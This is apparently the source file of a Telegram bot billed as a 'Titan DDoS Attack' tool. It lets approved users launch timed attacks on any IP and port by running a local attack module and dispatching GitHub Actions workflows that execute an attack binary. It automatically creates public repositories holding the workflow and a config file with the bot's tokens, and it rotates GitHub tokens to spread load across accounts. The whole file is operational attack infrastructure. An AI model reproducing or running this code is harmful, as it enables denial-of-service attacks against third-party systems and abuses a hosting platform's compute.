# bot.py
import time
import asyncio
import threading
import os
import base64
import requests
import json
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update

# Import configuration
from config import TELEGRAM_TOKEN, ADMIN_ID, BOT_OWNER, GITHUB_TOKENS, APPROVED_USERS

# Global variables
current_token_index = 0
approved_users = {user_id: True for user_id in APPROVED_USERS}
active_attacks = {}
github_repos = {}

def is_admin(user_id: int):
    return user_id == ADMIN_ID

def is_approved(user_id: int):
    return approved_users.get(user_id, False)

def approve_user(user_id: int):
    approved_users[user_id] = True

def get_next_github_token():
    global current_token_index
    if not GITHUB_TOKENS:
        return None
    token = GITHUB_TOKENS[current_token_index]
    current_token_index = (current_token_index + 1) % len(GITHUB_TOKENS)
    return token

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"Welcome to {BOT_OWNER}!")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to approve users.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    try:
        target_id = int(context.args[0])
        approve_user(target_id)
        await update.message.reply_text(f"✅ User {target_id} approved.")
    except ValueError:
        await update.message.reply_text("⚠️ Please provide a valid user ID.")

async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /upload <repo_name> [description]")
        return
    
    repo_name = context.args[0]
    description = " ".join(context.args[1:]) if len(context.args) > 1 else "Titan DDoS Attack Repository"
    
    if repo_name in github_repos:
        await update.message.reply_text(f"⚠️ Repository '{repo_name}' already exists.")
        return
    
    token = get_next_github_token()
    if not token:
        await update.message.reply_text("❌ No GitHub tokens available.")
        return
    
    await update.message.reply_text(f"🔄 Creating repository '{repo_name}'...")
    
    # Test token first
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Test authentication
    user_url = "https://api.github.com/user"
    try:
        user_response = requests.get(user_url, headers=headers, timeout=10)
        if user_response.status_code != 200:
            error_msg = user_response.json().get('message', 'Unknown error')
            await update.message.reply_text(f"❌ GitHub authentication failed: {error_msg}")
            return
        
        user_info = user_response.json()
        username = user_info.get('login', 'unknown')
        await update.message.reply_text(f"✅ Authenticated as: {username}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ GitHub connection error: {str(e)}")
        return
    
    # Create repository
    create_url = "https://api.github.com/user/repos"
    data = {
        "name": repo_name,
        "description": description,
        "auto_init": False,
        "private": False
    }
    
    try:
        response = requests.post(create_url, headers=headers, json=data, timeout=10)
        if response.status_code not in [200, 201]:
            error_msg = response.json().get('message', 'Unknown error')
            await update.message.reply_text(f"❌ Failed to create repository: {error_msg}")
            return
        
        repo_info = response.json()
        repo_url = repo_info["html_url"]
        owner_login = repo_info["owner"]["login"]
        
        await update.message.reply_text("🔄 Uploading files...")
        
        # Read files to upload
        files_to_upload = {}
        try:
            files_to_upload["bot.py"] = open("bot.py", "rb").read()
            files_to_upload["jay.py"] = open("jay.py", "rb").read()
            files_to_upload["requirements.txt"] = open("requirements.txt", "rb").read()
            
            # Create config.py for the repo
            repo_config = f"""# config.py
TELEGRAM_TOKEN = "{TELEGRAM_TOKEN}"
ADMIN_ID = {ADMIN_ID}
BOT_OWNER = "{BOT_OWNER}"
GITHUB_TOKENS = {json.dumps(GITHUB_TOKENS)}
APPROVED_USERS = {APPROVED_USERS}
"""
            files_to_upload["config.py"] = repo_config.encode('utf-8')
            
            # Read or create workflow file
            if os.path.exists(".github/workflows/jay.yml"):
                files_to_upload[".github/workflows/jay.yml"] = open(".github/workflows/jay.yml", "rb").read()
            else:
                # Create default workflow
                default_workflow = """name: Titan DDoS Attack
on:
  workflow_dispatch:
    inputs:
      ip:
        description: 'Target IP'
        required: true
        type: string
      port:
        description: 'Target Port'
        required: true
        type: string
      time:
        description: 'Attack Duration'
        required: true
        type: string

jobs:
  attack_worker:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Make soul binary executable
        run: chmod +x ./soul

      - name: Run attack
        run: python3 jay.py ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
"""
                files_to_upload[".github/workflows/jay.yml"] = default_workflow.encode('utf-8')
                
        except FileNotFoundError as e:
            await update.message.reply_text(f"❌ File not found: {e}")
            return
        
        # Upload files
        upload_errors = []
        for filepath, content in files_to_upload.items():
            if filepath.startswith(".github/"):
                api_path = filepath
            else:
                api_path = filepath.split("/")[-1]
            
            file_url = f"https://api.github.com/repos/{owner_login}/{repo_name}/contents/{api_path}"
            file_data = {
                "message": f"Add {api_path}",
                "content": base64.b64encode(content).decode('utf-8')
            }
            
            try:
                file_response = requests.put(file_url, headers=headers, json=file_data, timeout=10)
                if file_response.status_code not in [200, 201]:
                    error_msg = file_response.json().get('message', 'Unknown error')
                    upload_errors.append(f"{api_path}: {error_msg}")
            except Exception as e:
                upload_errors.append(f"{api_path}: {str(e)}")
        
        if upload_errors:
            error_text = "\n".join(upload_errors[:3])
            await update.message.reply_text(f"⚠️ Some files failed to upload:\n{error_text}")
        
        # Store repo info
        github_repos[repo_name] = {
            "url": repo_url,
            "token": token,
            "owner": owner_login,
            "workflow_runs": []
        }
        
        await update.message.reply_text(f"✅ Repository created successfully!\n📦 {repo_url}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error creating repository: {str(e)}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
        if time_int <= 0:
            await update.message.reply_text("⚠️ Time must be a positive number.")
            return
    except ValueError:
        await update.message.reply_text("⚠️ Invalid time.")
        return
    
    if not github_repos:
        await update.message.reply_text("❌ No GitHub repositories available. Use /upload first.")
        return
    
    repo_name = list(github_repos.keys())[0]
    repo_info = github_repos[repo_name]
    
    attack_id = f"{ip}:{port}:{time_s}"
    if attack_id in active_attacks:
        await update.message.reply_text("⚠️ This attack is already running.")
        return
    
    try:
        from jay import launch_attack
        success = launch_attack(ip, port, time_s)
        
        if success:
            active_attacks[attack_id] = {
                'start_time': time.time(),
                'duration': time_int,
                'user_id': user_id,
                'repo_name': repo_name
            }
            
            # Trigger workflow
            workflow_success = await trigger_workflow_dispatch(repo_name, repo_info, ip, port, time_s)
            
            if workflow_success:
                await update.message.reply_text(
                    f"🚀 Attack started on {ip}:{port} for {time_s} seconds!\n"
                    f"📦 Using repository: {repo_name}\n"
                    f"🔍 Monitoring workflows..."
                )
                
                asyncio.create_task(monitor_workflows(update, context, attack_id, repo_name))
                asyncio.create_task(attack_completion_notification(update, context, attack_id, time_int))
            else:
                await update.message.reply_text("⚠️ Attack started locally but failed to trigger workflow.")
        else:
            await update.message.reply_text("⚠️ Failed to start attack.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error starting attack: {e}")

async def trigger_workflow_dispatch(repo_name, repo_info, ip, port, time_s):
    try:
        headers = {
            "Authorization": f"token {repo_info['token']}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        dispatch_url = f"https://api.github.com/repos/{repo_info['owner']}/{repo_name}/actions/workflows/jay.yml/dispatches"
        data = {
            "ref": "main",
            "inputs": {
                "ip": ip,
                "port": port,
                "time": time_s
            }
        }
        
        response = requests.post(dispatch_url, headers=headers, json=data, timeout=10)
        return response.status_code in [200, 201]
    except Exception as e:
        print(f"Error triggering workflow: {e}")
        return False

async def monitor_workflows(update, context, attack_id, repo_name):
    if repo_name not in github_repos:
        return
    
    repo_info = github_repos[repo_name]
    headers = {
        "Authorization": f"token {repo_info['token']}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    workflow_url = f"https://api.github.com/repos/{repo_info['owner']}/{repo_name}/actions/runs"
    
    start_time = time.time()
    duration = active_attacks[attack_id]['duration']
    
    while time.time() - start_time < duration + 10:
        if attack_id not in active_attacks:
            break
            
        try:
            response = requests.get(workflow_url, headers=headers, timeout=10)
            if response.status_code == 200:
                workflow_data = response.json()
                workflow_runs = workflow_data.get('workflow_runs', [])
                
                status_counts = {
                    'queued': 0,
                    'in_progress': 0,
                    'completed': 0,
                    'failed': 0,
                    'total': len(workflow_runs)
                }
                
                for run in workflow_runs:
                    status = run.get('status', '')
                    conclusion = run.get('conclusion', '')
                    
                    if status == 'queued':
                        status_counts['queued'] += 1
                    elif status == 'in_progress':
                        status_counts['in_progress'] += 1
                    elif status == 'completed':
                        if conclusion == 'success':
                            status_counts['completed'] += 1
                        else:
                            status_counts['failed'] += 1
                
                status_message = (
                    f"📊 Workflow Status for {repo_name}:\n"
                    f"✅ Completed: {status_counts['completed']}\n"
                    f"🔄 In Progress: {status_counts['in_progress']}\n"
                    f"⏳ Queued: {status_counts['queued']}\n"
                    f"❌ Failed: {status_counts['failed']}\n"
                    f"📈 Total: {status_counts['total']}"
                )
                
                if 'status_message_id' not in active_attacks[attack_id]:
                    message = await update.message.reply_text(status_message)
                    active_attacks[attack_id]['status_message_id'] = message.message_id
                else:
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=active_attacks[attack_id]['status_message_id'],
                            text=status_message
                        )
                    except:
                        message = await update.message.reply_text(status_message)
                        active_attacks[attack_id]['status_message_id'] = message.message_id
                
                github_repos[repo_name]['workflow_runs'] = workflow_runs
                
            await asyncio.sleep(5)
        except Exception as e:
            print(f"Error monitoring workflows: {e}")
            await asyncio.sleep(5)

async def attack_completion_notification(update, context, attack_id, duration):
    await asyncio.sleep(duration)
    if attack_id in active_attacks:
        ip, port, time_s = attack_id.split(':')
        await update.message.reply_text(f"✅ Attack finished on {ip}:{port}!")
        
        if 'status_message_id' in active_attacks[attack_id]:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=active_attacks[attack_id]['status_message_id']
                )
            except:
                pass
        
        del active_attacks[attack_id]

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /stop <attack_id>")
        return
    
    attack_id = context.args[0]
    if attack_id in active_attacks:
        try:
            from jay import stop_attack
            ip, port, time_s = attack_id.split(':')
            success = stop_attack(ip, port)
            
            if success:
                if 'status_message_id' in active_attacks[attack_id]:
                    try:
                        await context.bot.delete_message(
                            chat_id=update.effective_chat.id,
                            message_id=active_attacks[attack_id]['status_message_id']
                        )
                    except:
                        pass
                
                del active_attacks[attack_id]
                await update.message.reply_text(f"✅ Attack {attack_id} stopped!")
            else:
                await update.message.reply_text(f"⚠️ Failed to stop attack {attack_id}.")
        except Exception as e:
            await update.message.reply_text(f"⚠️ Error stopping attack: {e}")
    else:
        await update.message.reply_text("⚠️ Attack ID not found.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if active_attacks:
        status_text = "🟢 Active Attacks:\n"
        for attack_id, info in active_attacks.items():
            elapsed = int(time.time() - info['start_time'])
            remaining = max(0, info['duration'] - elapsed)
            status_text += f"• {attack_id} - {remaining}s remaining\n"
        await update.message.reply_text(status_text)
    else:
        await update.message.reply_text("ℹ️ No active attacks.")
    
    if github_repos:
        repos_text = "📦 GitHub Repositories:\n"
        for repo_name, repo_info in github_repos.items():
            repos_text += f"• {repo_name} - {repo_info['url']}\n"
        await update.message.reply_text(repos_text)
    else:
        await update.message.reply_text("ℹ️ No GitHub repositories.")

async def list_repos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if github_repos:
        repos_text = "📦 Available Repositories:\n"
        for repo_name, repo_info in github_repos.items():
            repos_text += f"• {repo_name} - {repo_info['url']}\n"
        await update.message.reply_text(repos_text)
    else:
        await update.message.reply_text("ℹ️ No GitHub repositories available.")

async def list_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to view tokens.")
        return
    
    if not GITHUB_TOKENS:
        await update.message.reply_text("ℹ️ No GitHub tokens configured.")
        return
    
    tokens_text = "🔑 GitHub Tokens:\n"
    for i, token in enumerate(GITHUB_TOKENS):
        status = "✅" if token.startswith('ghp_') else "❌"
        tokens_text += f"{i+1}. {status} {token[:8]}...\n"
    
    await update.message.reply_text(tokens_text)

def main():
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("repos", list_repos))
    application.add_handler(CommandHandler("tokens", list_tokens))
    application.run_polling()

if __name__ == "__main__":
    main()
